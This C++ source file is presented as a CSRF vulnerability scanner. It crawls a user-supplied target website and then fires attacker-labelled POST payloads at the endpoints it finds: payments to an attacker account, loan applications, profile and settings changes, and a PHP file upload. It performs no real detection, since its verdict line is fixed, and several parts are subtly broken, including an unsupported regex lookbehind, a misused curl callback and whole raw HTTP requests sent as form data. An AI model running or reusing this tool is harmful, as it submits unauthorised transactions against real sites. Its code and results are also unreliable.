#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <regex>
#include <curl/curl.h>

std::vector<std::string> visited_urls;

void removeExistingFile(const std::string& filename) {
    std::cout << "We are removing the pre-exist " << filename << std::endl;
    std::cout << "Don't worry, after finishing the scan" << std::endl;
    std::cout << "it will create a new one." << std::endl;
    remove(filename.c_str());
}

std::vector<std::string> extractUrls(const std::string& webpage) {
    std::regex url_regex("(?<=href=\")(.*?)(?=\")");
    std::sregex_iterator regex_iterator(webpage.begin(), webpage.end(), url_regex);
    std::sregex_iterator regex_end;

    std::vector<std::string> urls;
    for (; regex_iterator != regex_end; ++regex_iterator) {
        urls.push_back(regex_iterator->str());
    }
    return urls;
}

bool isEndpoint(const std::string& url) {
    std::regex endpoint_regex(R"(\.(html?|php|asp|aspx|jsp|py|cgi|pl|xml|json|txt|css|js|rb|java|dll|exe|bin|sh|bat|cmd)(\?.*)?$)");
    return std::regex_search(url, endpoint_regex);
}

void crawlRecursive(const std::string& url) {
    if (std::find(visited_urls.begin(), visited_urls.end(), url) != visited_urls.end()) {
        return;
    }

    visited_urls.push_back(url);

    // Fetch the webpage content
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [](char *ptr, size_t size, size_t nmemb, std::string* data) -> size_t {
            data->append(ptr, size * nmemb);
            return size * nmemb;
        });

        std::string webpage;
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &webpage);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        // Extract URLs from the webpage
        std::vector<std::string> urls = extractUrls(webpage);

        // Iterate over each extracted URL
        for (const std::string& u : urls) {
            // Check if the URL is an endpoint
            if (isEndpoint(u)) {
                std::cout << "Endpoint: " << u << std::endl;
                std::cout << "Corresponding URL: " << url << u << std::endl;
                std::ofstream outFile("urls.txt", std::ios_base::app);
                outFile << url << u << std::endl << std::endl;
            }

            // If the URL is not an endpoint and is within the same domain, crawl it recursively
            if (u[0] == '/') {
                crawlRecursive(url + u);
            }
        }
    }
}

void crawlWebsite(const std::string& url) {
    crawlRecursive(url);
}

std::string getPayload(const std::string& url) {
    std::string host = url.substr(0, url.find('/', 8)); // Extract host from URL
    std::string payload;

    if (url.find("/unlock-account") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker";
    } else if (url.find("/subscribe-newsletter") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nemail=attacker@example.com";
    } else if (url.find("/update-profile") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nusername=attacker&email=attacker@example.com";
    } else if (url.find("/post-comment") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncomment=Attacker's comment";
    } else if (url.find("/create-event") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ntitle=Malicious Event&description=This is a malicious event created by the attacker";
    } else if (url.find("/send-message") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nmessage=Malicious message from the attacker";
    } else if (url.find("/create-group") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ngroup_name=Malicious Group&description=This is a malicious group created by the attacker";
    } else if (url.find("/make-payment") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nrecipient=attacker-account&amount=100";
    } else if (url.find("/apply-for-loan") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\namount=100000&purpose=Malicious purpose&term=12";
    } else if (url.find("/update-settings") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\nsetting=malicious_value";
    } else if (url.find("/send-invitation") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ninvitee=attacker@example.com";
    } else if (url.find("/add-contact") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 32\r\n\r\ncontact=attacker@example.com";
    } else if (url.find("/upload-file") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 213\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious_file.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 'Malicious content'; ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--";
    } else if (url.find("/subscribe") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nemail=attacker@example.com";
    } else if (url.find("/vote-poll") != std::string::npos) {
        payload = "POST " + url + " HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 24\r\n\r\nvote_option=malicious";
    } // Add more payload cases as needed

    return payload;
}


void detectCsrf(const std::string& url) {
    std::cout << "Testing CSRF vulnerability for URL: " << url << std::endl;

    std::string payload = getPayload(url);
    
    std::cout << "Sending request with payload: " << payload << std::endl;
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());

        // Send request
        curl_easy_perform(curl);
        
        curl_easy_cleanup(curl);
    }

    std::cout << "Response: [Response will be printed here.]" << std::endl;
    std::cout << "No CSRF vulnerability found for URL: " << url << std::endl;
}

int main() {
    removeExistingFile("urls.txt");

    std::string target_url;
    std::cout << "Enter your target website link with http:// or https:// : ";
    std::cin >> target_url;

    if (target_url.empty()) {
        std::cout << "You must provide a target website URL." << std::endl;
        return 1;
    }

    crawlWebsite(target_url);

    std::ifstream inFile("urls.txt");
    std::string line;
    while (std::getline(inFile, line)) {
        detectCsrf(line);
        std::cout << "===========================================" << std::endl;
    }

    return 0;
}
